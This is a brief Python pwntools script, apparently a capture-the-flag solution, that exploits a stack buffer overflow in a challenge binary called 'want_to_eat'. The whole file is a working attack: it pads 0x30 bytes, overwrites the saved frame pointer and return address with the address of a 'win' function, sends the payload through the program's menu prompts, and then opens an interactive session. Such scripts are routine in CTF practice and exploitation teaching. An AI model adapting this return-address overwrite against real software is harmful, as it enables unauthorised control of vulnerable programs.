from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./want_to_eat"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote("", 9999)


def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()

# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))

win = 0x401216 
payload = b"a"*0x30
payload += p64(0)
payload += p64(win)
ddebug("break *0x4012BE\n b *0x0401311 \n continue")
io.sendlineafter(b"\x80\x3a\x20", "1")

io.sendlineafter(b"\x8f\x3a\x20", payload)
io.sendlineafter(b"\xb0\x3a\x20", "1")

io.interactive()
